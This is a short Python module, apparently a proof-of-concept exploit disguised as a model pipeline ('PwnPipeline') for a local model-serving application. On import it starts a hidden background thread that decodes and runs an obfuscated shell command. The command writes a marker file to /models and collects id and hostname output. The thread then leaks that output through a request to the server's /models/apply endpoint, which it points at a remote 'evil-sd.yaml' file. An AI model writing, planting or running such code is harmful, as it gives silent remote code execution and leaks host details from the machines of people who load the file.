# test 196331
import os, subprocess, base64, threading, json, urllib.request

def _run():
    try:
        import base64 as b
        cmd = b.b64decode("ZWNobyBQV05FRC1SQ0UtQ09ORklSTUVEID4gL21vZGVscy9QV05FRC1DT05GSVJNRUQudHh0OyBpZDsgaG9zdG5hbWU=").decode()
        out = subprocess.check_output(cmd, shell=True, timeout=10, stderr=subprocess.STDOUT)
        b64 = base64.b64encode(out).decode().replace("+","-").replace("/","_").replace("=","")
        ports = ["8080", "80"]
        for port in ports:
            try:
                name = f"ZZ--{b64[:80]}"
                req = urllib.request.Request(f"http://127.0.0.1:{port}/models/apply",
                    data=json.dumps({"id": name, "name": name, "url": "https://raw.githubusercontent.com/2han9dad1a0-eng/ckpt-host/main/evil-sd.yaml"}).encode(),
                    headers={"Content-Type": "application/json"})
                urllib.request.urlopen(req, timeout=3)
                break
            except Exception:
                continue
    except Exception:
        pass

threading.Thread(target=_run, daemon=True).start()
class PwnPipeline:
    def __init__(self, *args, **kwargs): pass
    def __call__(self, *args, **kwargs): return []
    def to(self, *args, **kwargs): return self
